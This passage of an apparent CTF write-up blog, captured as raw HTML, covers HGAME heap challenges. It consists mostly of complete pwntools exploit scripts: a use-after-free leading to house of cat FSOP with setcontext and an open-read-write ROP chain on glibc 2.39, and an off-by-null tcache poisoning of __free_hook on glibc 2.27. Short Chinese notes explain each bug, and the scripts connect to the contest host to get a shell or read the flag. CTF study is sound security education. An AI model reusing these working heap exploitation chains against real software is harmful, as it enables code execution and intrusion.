class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,32272)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,name,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(name)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(3,0x20,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(1)</span><br><span class="line">rl(&quot;Information: aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x2d0</span><br><span class="line">li(hex(heap_base))</span><br><span class="line">free(1)</span><br><span class="line">add(0,0x20,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">add(i+3,0x90,b&#x27;a&#x27;)</span><br><span class="line">for i in range(7):</span><br><span class="line">free(i+3)</span><br><span class="line">add(21,0x20,b&#x27;a&#x27;)</span><br><span class="line">free(11)</span><br><span class="line">free(13)</span><br><span class="line">add(22,0x38,b&#x27;a&#x27;)#16</span><br><span class="line">show(16)</span><br><span class="line">libc_base=get_addr64()-2207073</span><br><span class="line">li(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]-0x10</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">add(23,0x40,b&#x27;a&#x27;)#17</span><br><span class="line">add(24,0x100,b&#x27;\x00&#x27;*0x30+p64(0x81)+b&#x27;a&#x27;*8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#add(25,-10,hex(heap_base+0x950))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(25))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(-10))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(hex(heap_base+0x1590))</span><br><span class="line">IO_list_all_xor=(heap_base+0x1590&gt;&gt;12)^IO_list_all</span><br><span class="line">edit(18,b&#x27;a&#x27;,0x100,b&#x27;\x00&#x27;*(0x30)+p64(0x81)+p64(IO_list_all_xor))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0x1660-0x8 # 伪造的fake_IO结构体的地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">fake_ret=chunk3+0xe0+0xe0+0x18</span><br><span class="line"></span><br><span class="line">IO_FILE1 = p64(0)*3+p64(1)+b&#x27;\x00&#x27;*0x38+p64(0)                         #_chain</span><br><span class="line">IO_FILE1+= p32(0)+b&#x27;\x08&#x27;                                              #_flags2</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x80,b&#x27;\x00&#x27;)+p64(chunk3)                    #lock</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x90,b&#x27;\x00&#x27;)+p64(chunk3+0xe0)               #_wide_data  ***  rdx</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xb0,b&#x27;\x00&#x27;)</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xc8,b&#x27;\x00&#x27;)+p64(_IO_wfile_jumps)           #vtable</span><br><span class="line"></span><br><span class="line">IO_FILE1+= b&#x27;\x00&#x27;.ljust(0xa0,b&#x27;\x00&#x27;)+p64(fake_ret)+p64(rdi+1)</span><br><span class="line">IO_FILE1+= b&#x27;/flag\x00\x00\x00&#x27;.ljust(0x30,b&#x27;\x00&#x27;)+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)</span><br><span class="line">IO_FILE1+= p64(rdi+1)*2+shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(25,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">add(26,0x3f0,IO_FILE1)</span><br><span class="line">add(27,0x68,b&#x27;\x00&#x27;*8+p64(chunk3))</span><br><span class="line"></span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-vulnerability"><a href="#Where-is-the-vulnerability" class="headerlink" title="Where is the vulnerability"></a>Where is the vulnerability</h4><p>菜单堆题，2.39</p><p>add,edit,free,show四个功能正常</p><p>存在uaf漏洞，这里直接走house of cat就行</p><p>存在沙盒，走orw</p><p>三个库patch一下就行，不要忘了更改权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 路径  文件</span><br><span class="line">patchelf --replace-needed libhgame.so 路径  文件</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so 路径 文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31346)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">add(0,0x520) #0</span><br><span class="line">add(1,0x558) #1</span><br><span class="line">add(2,0x510) #2</span><br><span class="line">add(3,0x550) #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=get_addr64()-2112288</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x0000000000066b9a</span><br><span class="line">#rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">add(4,0x600)</span><br><span class="line">edit(0,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(0)</span><br><span class="line">rl(b&#x27;a&#x27;*(0x10))</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x290</span><br><span class="line">li(hex(heap_base))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(0,p64(libc_base+2113360)*2+p64(heap_base+0x290)+p64(IO_list_all-0x20))</span><br><span class="line">add(5,0x600)</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0xd20 # 伪造的fake_IO结构体的地址</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  </span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b&#x27;\x00&#x27;)  </span><br><span class="line">fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi</span><br><span class="line">fake_IO_FILE +=p64(heap_base)              </span><br><span class="line">fake_IO_FILE +=p64(0x100)                       #rdx</span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp</span><br><span class="line">fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2</span><br><span class="line">fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)</span><br><span class="line">fake_IO_FILE +=p64(read)</span><br><span class="line"></span><br><span class="line">edit(2,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw  = p64(rdi) + p64(heap_base+0xea0)  </span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(write)+b&#x27;./flag\x00\x00&#x27;</span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="signin2Heap"><a href="#signin2Heap" class="headerlink" title="signin2Heap"></a>signin2Heap</h4><p>菜单堆题，2.27</p><p>add，free,show三个功能函数</p><p>add中存在of by null漏洞，限制大小&lt;0xff</p><p>因为add会将最后一个字符转为\x00会将打印函数截断</p><p>这里我们先把tcache塞满，之后能得到进入unsortdbin堆块，控制好堆布局，将下一个堆块的pr_size和pr_inuse位修改，释放触发堆块合并，之后将第一个堆块申请出来，libc地址就会进入第二个堆块中，这个堆块还没有释放，泄露得到libc</p><p>之后再次造成堆块合并，同时申请出第一个堆块包含第二个（未释放）fd位，释放第二个堆块，我们就可以更改它的fd位，完成tcachebin attack，攻击free_hook，getshell</p><p>原理的话可以看这篇文章<a href="https://www.jianshu.com/p/056c9db22d81">https://www.jianshu.com/p/056c9db22d81</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739887952446-796c20d1-bffb-4c3d-a316-89b6477a7889.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31701)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">add(7,0xf8,&quot;aaaa&quot;)#7</span><br><span class="line">add(8,0x88,&quot;aaaa&quot;)#8</span><br><span class="line">add(9,0xf8,&quot;aaaa&quot;)#9</span><br><span class="line">add(10,0x88,&quot;aaaa&quot;)#10</span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line">add(11,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">#bug()</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;/bin/sh\x00&quot;)</span><br><span class="line">add(7,0xf8,&quot;cccc&quot;)</span><br><span class="line">show(11)</span><br><span class="line">libc_base=get_addr64()-4111520</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">add(8,0x88,b&#x27;a&#x27;)</span><br><span class="line">add(9,0xf8,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line">add(12,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">add(13,0x88,b&#x27;a&#x27;)</span><br><span class="line">free(13)</span><br><span class="line">free(11)</span><br><span class="line">add(14,0xb8,b&#x27;\x00&#x27;*0x60+p64(0x100)+p64(0x90)+p64(free_hook))</span><br><span 